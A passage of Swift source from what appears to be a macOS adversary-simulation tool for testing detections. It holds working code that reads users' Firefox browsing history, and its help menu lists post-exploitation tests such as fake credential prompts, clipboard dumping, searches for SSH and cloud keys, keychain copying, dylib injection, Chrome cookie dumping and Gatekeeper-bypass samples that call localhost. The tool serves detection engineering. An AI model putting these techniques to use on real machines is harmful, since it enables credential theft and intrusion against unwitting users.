        print("\(red)[-] Chrome History database not found for user \(username)\(colorend)")
    }

    //firefox history check
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/"){
        let fileEnum = fileMan.enumerator(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/")
        print("")
        print("\(green)***************Firefox history results for user \(username)***************\(colorend)")

        while let each = fileEnum?.nextObject() as? String {
            if each.contains("places.sqlite"){
                let placesDBPath = "/Users/\(username)/Library/Application Support/Firefox/Profiles/\(each)"
                var db : OpaquePointer?
                let dbURL = URL(fileURLWithPath: placesDBPath)

                let printTest = sqlite3_open(dbURL.path, &db)

                if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                    print("\(red)[-] Could not open the Firefox history database file for user \(username)\(colorend)")
                } else {

                    let queryString = "select datetime(visit_date/1000000,'unixepoch') as time, url FROM moz_places, moz_historyvisits where moz_places.id=moz_historyvisits.place_id order by time;"

                    var queryStatement: OpaquePointer? = nil

                    if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{

                        while sqlite3_step(queryStatement) == SQLITE_ROW{
                            let col1 = sqlite3_column_text(queryStatement, 0)
                            if col1 != nil{
                                ffoxDate = String(cString: col1!)
                            }

                            let col2 = sqlite3_column_text(queryStatement, 1)
                            if col2 != nil{
                                ffoxURL = String(cString: col2!)
                            }

                             print("Date: \(ffoxDate) | URL: \(ffoxURL)")

                        }

                        sqlite3_finalize(queryStatement)

                    }


                }
            }
        }
    }
    else {
        print("\(red)[-] Firefox places.sqlite database not found for user \(username)\(colorend)".data(using: .utf8)!)
    }
}


func OfficeMacro(){
    print("\(green)[+] You can use the included macro.txt file to test for detections of macro execution from MS Office docs. You can simply paste the included macro.txt contents inside of an MS Office Document, close office out, re-open, and click \"Enable Macros\" to detonate it. It will make an http connection using curl to http://127.0.0.1/testing\(colorend)")
}

func InstallerPkg(){
    print("\(green)[+] You can use the included TestInstaller.pkg file to test for detections around a basic installer package. This installer package includes a preinstall script which runs in bash and drops com.simple.agent.plist to /Library/LaunchDaemons/ and drops test.js (simple popup prompt) to /Library/Application Support/. It also includes a postinstall script which runs in bash and loads the com.simple.agent.plis using launchctl load. While holding the Control button click Open on TestInstaller.pkg to run it. TestInstaller.pkg will drop the aforementioned files as root.\(colorend)")
}

func GKBypass1() {
    print("\(green)[+] You can use the included GKBypass1.dmg file to test for detections around a payload that abuses CVE-2021-30657. This is a shell script masqeuraded as a .app package (placed inside of a .app/Contents/MacOS directory structure) which when executed will run curl and make a request to 127.0.0.1. First, open a terminal window and run a netcat listener on port 80. Then double click the .dmg and the .app inside of it and the fake app will detonate and make a local host connection. Then you can check your logs for visbility. You should be able to find runtime detections using the following:")
    print("")
    print("===> process path: /bin/bash /bin/sh or /bin/zsh")
    print("===> arguments: contains /Contents/MacOS/ ")
    print("===> parent pid: launchd (pid: 1)")
    print("===> arguments: does not contain “Parallels” (shoutout to Chris Ford @crford for this additional logic)\(colorend)")
}

func GKBypass2() {
    print("\(green)[+] You can use the included CVE-2021-30657.dmg file to test for detections around a payload that abuses CVE-2021-30657. This payload is slightly different from the payload GKBypass1.dmg. This payload is simply a shell script renamed as a .app file. When executed will run curl and make a request to 127.0.0.1. First, open a terminal window and run a netcat listener on port 80. Then double click the .dmg and the .app inside of it and the fake app will detonate and make a local host connection. Then you can check your logs for visbility. You should be able to find runtime detections using the following:")
    print("")
    print("===> process path: /bin/bash or /bin/sh or /bin/zsh /System/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python or /usr/bin/python")
    print("===> arguments: contains .app but does not contain /Contents/MacOS/")
    print("===> parent pid: launchd (pid: 1)")
    print("Depending on your environment this search could turn up a large number of results of engineers who run scripts by changing the file extension to .app, but this search should be a good starting point.\(colorend)")
}



       let flManager = FileManager.default

       Banner()

       for argument in CommandLine.arguments{
           if argument.contains("-h"){
               print("\(yellow)Swift Attck Options:\(colorend)")
               print("")
               print("\(blue)OTHER POST EXPLOITATION TESTS:")
               print("\(cyan)-Prompt-1 --> \(colorend)Prompt for creds by using the on-disk osascript binary")
               print("\(cyan)-Prompt-2 --> \(colorend)Prompt for creds using API calls (on disk osascript binary not used)")
               print("\(cyan)-Clipboard-1 --> \(colorend)Dump clipboard contents via on-disk osascript binary")
               print("\(cyan)-Clipboard-2 --> \(colorend)Dump clipboard contents using API calls (on disk osascript binary not used")
               print("\(cyan)-Screenshot-1 --> \(colorend)NOTE: THIS TTP REQUIRES SCREEN RECORDING TCC PERMISSIONS! Perform a screenshot using the on-disk screencapture binary")
               print("\(cyan)-Screenshot-2 --> \(colorend)NOTE: THIS TTP REQUIRES SCREEN RECORDING TCC PERMISSIONS! Perform a screenshot using API calls")
               print("\(cyan)-Userhist --> \(colorend)Read from the user's zsh history file")
               print("\(cyan)-AV-Enum --> \(colorend)Enumerate running apps for security tools")
               print("\(cyan)-SystemInfo-1 --> \(colorend)Grab system info using the on-disk osascript binary")
               print("\(cyan)-SystemInfo-2 --> \(colorend)Grab system info using API calls")
               print("\(cyan)-KeySearch --> \(colorend)Search for ssh, aws, gcp, and azure keys on disk")
               print("\(cyan)-BrowserHistory --> \(colorend)Grab User Quarantine, Safari, Chrome, and Firefox history")
               print("\(cyan)-OfficeMacro --> \(colorend)Use a simple office macro that connects to local host. Note: the macro will invoke curl to make a GET request using python to http://127.0.0.1/testing when executed by clicking the \"Enable Macros\" button. This will allow you to test detections for parent-child relationships around macro execution. Note: this simple test does not include any obfuscation, since the test is really more geared towards parent-child relationships. You can use another repo of mine at https://github.com/cedowens/MacC2 to test with obfuscated macros.")
               print("\(cyan)-InstallerPkg --> \(colorend)Use the included sample installer package (\"TestInstaller.pkg\") to test detections around a simple package installer.")
               print("\(cyan)-GKBypass1 --> \(colorend)Use the included sample GKBypass1 (\"GKBypass1.dmg\") to test detections around the CVE-2021-30657 bug.")
               print("\(cyan)-GKBypass2 --> \(colorend)Use the included sample GKBypass2 (\"GKBypass2.dmg\") to test detections around the CVE-2021-30657 bug.")
               print("\(cyan)-LaunchAgent --> \(colorend)Drop a simple Launch Agent to run calc.")
               print("\(cyan)-LoginItem --> \(colorend)Add calc as a Login Item.")
               print("\(cyan)-CopyKeychain --> \(colorend)Copies the user Keychain db to /tmp. This is a simple local simulation of an attack that exfils the keychain.")
               print("\(cyan)-InjectDylib --> \(colorend)NOTE: THIS TTP REQUIRES THAT FIREFOX IS INSTALLED TO WORK! Inject a dylib that runs calc into an app that has the allow-dyld-environment-variables entitlement (by default this TTP uses Firefox)")
               print("\(cyan)-DumpCookies --> \(colorend)NOTE: THIS TTP REQUIRES THAT GO IS INSTALLED TO WORK! Runs Chrome with the remote debugger port and uses @slyd0g's WhiteChcolateMacademiaNut tool to attempt to dump cookies.")
               print("\(yellow)***To test persistence methods, I recommend checking out https://github.com/D00MFist/PersistentJXA, as this is the most comprehensive list of persistence methods I know of for macOS***")
               print("")
               print("\(yellow)Usage:\(colorend)")
               print("To run certain options:  \(binname) [option1] [option2] [option3]...")
               print("")
               exit(0)
           }
           else {
               if argument == "-Prompt-1"{
                   Prompt1()
               }
               if argument == "-Prompt-2"{
                   Prompt2()
               }
               if argument == "-Clipboard-1"{
                   Clipboard1()
               }
               if argument == "-Clipboard-2"{
                   Clipboard2()
               }
               if argument == "-Screenshot-1"{
                   Screenshot1()
               }
               if argument == "-Screenshot-2"{
                   Screenshot2()
               }

               if argument == "-Userhist"{
                   Userhist()
               }
               if argument == "-AV-Enum"{
                   AVEnum()
               }
               if argument == "-SystemInfo-1"{
                   SystemInfo1()
               }
               if argument == "-SystemInfo-2"{
                   SystemInfo2()
               }
               if argument == "-KeySearch"{
                   KeySearch()
               }
               if argument == "-BrowserHistory"{
                   BrowserHist()
               }
               if argument == "-OfficeMacro"{
                   OfficeMacro()
               }
               if argument == "-InstallerPkg"{
                    InstallerPkg()
               }
            if argument == "-GKBypass1"{
                GKBypass1()
            }

            if argument == "-GKBypass2"{
                GKBypass2()
            }

            if argument == "-LaunchAgent"{
                LaunchAgent()
            }

            if argument == "-LoginItem"{
                LoginItem()
            }

            if argument == "-CopyKeychain"{
                CopyKeychain()
            }

            if argument == "-InjectDylib"{
                InjectDylib()
            }

            if argument == "-DumpCookies"{
                DumpCookies()
            }
           }
       }
